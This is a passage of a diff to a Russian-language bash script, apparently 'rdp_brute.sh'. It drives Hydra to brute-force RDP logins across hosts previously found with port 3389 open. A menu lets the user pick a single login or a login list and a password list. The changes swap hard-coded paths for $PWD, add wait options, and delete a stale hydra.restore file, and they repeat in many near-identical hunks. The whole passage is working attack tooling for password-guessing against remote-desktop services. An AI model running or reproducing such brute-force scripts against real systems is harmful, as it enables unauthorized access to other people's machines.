 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -1054,7 +1090,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1064,7 +1100,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1074,7 +1110,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1083,7 +1119,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1111,6 +1147,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -1122,7 +1162,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1132,7 +1172,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1142,7 +1182,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1151,7 +1191,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1179,6 +1219,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -1190,7 +1234,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1200,7 +1244,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1210,7 +1254,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1219,7 +1263,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1248,6 +1292,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -1259,7 +1307,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1269,7 +1317,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1279,7 +1327,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1288,7 +1336,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1317,6 +1365,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -1328,7 +1380,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1338,7 +1390,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1348,7 +1400,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1357,7 +1409,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1386,6 +1438,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -1397,7 +1453,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1407,7 +1463,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1417,7 +1473,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1426,7 +1482,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1455,6 +1511,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -1466,7 +1526,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1476,7 +1536,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1486,7 +1546,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1495,7 +1555,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1524,6 +1584,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -1535,7 +1599,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1545,7 +1609,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1555,7 +1619,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1564,7 +1628,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1593,6 +1657,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -1604,7 +1672,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1614,7 +1682,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1624,7 +1692,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1633,7 +1701,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1662,6 +1730,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -1673,7 +1745,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1683,7 +1755,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1693,7 +1765,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1702,7 +1774,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1731,6 +1803,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -1742,7 +1818,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1752,7 +1828,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1762,7 +1838,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1771,7 +1847,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1800,6 +1876,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -1811,7 +1891,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1821,7 +1901,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1831,7 +1911,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1840,7 +1920,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -1868,6 +1948,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -1879,7 +1963,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
